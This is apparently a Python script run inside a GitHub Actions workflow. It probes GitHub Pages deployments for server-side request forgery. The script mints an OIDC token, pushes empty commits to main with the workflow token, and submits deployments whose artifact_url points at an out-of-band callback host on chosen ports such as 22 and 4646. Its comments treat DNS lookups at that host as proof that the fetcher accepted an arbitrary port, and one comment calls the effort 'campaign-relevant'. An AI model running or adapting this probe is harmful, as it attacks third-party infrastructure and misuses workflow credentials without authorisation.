import json, os, ssl, sys, time, urllib.request, urllib.error
OOB="db87skm3586burj09f20h5ngpc9gk59xs.oast.site"
RUN=os.environ.get("GITHUB_RUN_ID","0"); REPO=os.environ["GITHUB_REPOSITORY"]
ART=os.environ.get("ART_ID","").strip(); GH=os.environ["GH_TOKEN"]; API="https://api.github.com"
def http(u,m="GET",b=None,t=30):
    r=urllib.request.Request(u,method=m,data=json.dumps(b).encode() if b is not None else None)
    r.add_header("Authorization",f"Bearer {GH}"); r.add_header("Accept","application/vnd.github+json")
    r.add_header("X-GitHub-Api-Version","2022-11-28")
    if b is not None: r.add_header("Content-Type","application/json")
    try:
        with urllib.request.urlopen(r,timeout=t,context=ssl.create_default_context()) as z:
            return z.status,z.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")
    except Exception as e: return -1,f"<{type(e).__name__}:{e}>"
def mint():
    r=urllib.request.Request(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"])
    r.add_header("Authorization",f"bearer {os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']}")
    with urllib.request.urlopen(r,timeout=30,context=ssl.create_default_context()) as z:
        return json.loads(z.read().decode()).get("value","") or ""
def mkcommit(tag):
    s,b=http(f"{API}/repos/{REPO}/git/ref/heads/main")
    try: parent=json.loads(b)["object"]["sha"]
    except Exception: return None
    s,b=http(f"{API}/repos/{REPO}/git/commits/{parent}")
    try: tree=json.loads(b)["tree"]["sha"]
    except Exception: return None
    s,b=http(f"{API}/repos/{REPO}/git/commits","POST",{"message":f"p8-{tag}-{RUN}","tree":tree,"parents":[parent]})
    try: new=json.loads(b)["sha"]
    except Exception: return None
    http(f"{API}/repos/{REPO}/git/refs/heads/main","PATCH",{"sha":new,"force":False})
    return new

print("=== ARMS8-START ===",flush=True)
print(f"[oob] {OOB}",flush=True)
try:
    if not ART: print("🔴 ARMING GATE FAILED: no artifact id.",flush=True); sys.exit(0)
    # c92e52ec's question: does the fetcher honour a CALLER-CHOSEN PORT?
    # Oracle is DNS at my own server: a unique SUBDOMAIN per arm, so the query names the arm.
    # DNS must fire BEFORE any connection, so DNS firing on an odd port == the port was accepted.
    PLAN=[
      ("c80",   f"http://c80.{OOB}/x-{RUN}",            "POSITIVE CONTROL: default port 80, my server listens"),
      ("c443",  f"https://c443.{OOB}/x-{RUN}",          "POSITIVE CONTROL: default 443, my server listens"),
      ("p1",    f"http://p1.{OOB}:1/x-{RUN}",           "port 1 - nothing listens; DNS alone is the signal"),
      ("p8080", f"http://p8080.{OOB}:8080/x-{RUN}",     "port 8080"),
      ("p4646", f"http://p4646.{OOB}:4646/x-{RUN}",     "port 4646 (Nomad) - campaign-relevant"),
      ("p22",   f"http://p22.{OOB}:22/x-{RUN}",         "port 22"),
      ("nourl", None,                                    "NO artifact_url at all - baseline"),
    ]
    for tag,url,why in PLAN:
        tok=mint()
        if len(tok)<20: print(f"  {tag}: 🔴 OIDC VOID",flush=True); continue
        bver=mkcommit(tag)
        if not bver: print(f"  {tag}: 🔴 COMMIT VOID",flush=True); continue
        body={"pages_build_version":bver,"oidc_token":tok,"artifact_id":int(ART)}
        if url: body["artifact_url"]=url
        s,b=http(f"{API}/repos/{REPO}/pages/deployments","POST",body)
        did=None
        try: did=json.loads(b).get("id")
        except Exception: pass
        print(f"  {tag:<6} POST {s:<4} dep={str(did)[:12]:<12} url={url}",flush=True)
        print(f"         [{why}]",flush=True)
        if did:
            # give the fetcher time to resolve + attempt, then free the one-at-a-time lock
            time.sleep(40)
            http(f"{API}/repos/{REPO}/pages/deployments/{did}/cancel","POST",{})
        time.sleep(4)
    print("\nAll arms fired. The ORACLE IS NOT THIS LOG -- it is the DNS/HTTP interactions at the",flush=True)
    print("OOB server, attributed by SUBDOMAIN. A DNS query for p1/p8080/p4646/p22 proves the",flush=True)
    print("fetcher accepted a caller-chosen port and tried to connect.",flush=True)
finally:
    print("=== ARMS8-END ===",flush=True)
